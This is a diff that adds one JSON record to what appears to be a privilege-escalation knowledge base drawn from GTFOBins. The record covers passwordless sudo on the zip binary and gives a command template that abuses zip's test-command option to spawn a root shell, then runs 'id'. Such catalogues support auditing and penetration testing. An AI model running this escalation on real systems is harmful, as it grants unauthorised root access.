@@ -1,0 +1,1 @@
+{"id":"sudo_zip","category":"SUDO_NOPASSWD_CUSTOM","binary":"zip","cve":null,"exploitation":["sudo {{binary}} /tmp/priv /etc/hosts -T -TT '{{shell}} #'"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins"],"severity":"high"}
